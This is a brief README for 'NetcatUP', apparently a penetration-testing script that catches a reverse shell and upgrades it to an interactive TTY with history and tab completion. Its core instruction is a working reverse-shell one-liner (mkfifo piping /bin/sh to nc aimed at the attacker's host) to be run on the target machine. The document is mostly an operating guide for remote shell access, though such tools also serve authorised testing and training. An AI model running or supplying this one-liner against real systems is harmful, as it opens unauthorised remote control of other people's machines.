# NetcatUP


run `./netcatup.sh port`  
run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc targetip port >/tmp/f` on the target machine  
You should now have a fully interactive shell with bash history and tab completion  

### credits: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### todo:  
* add bind support
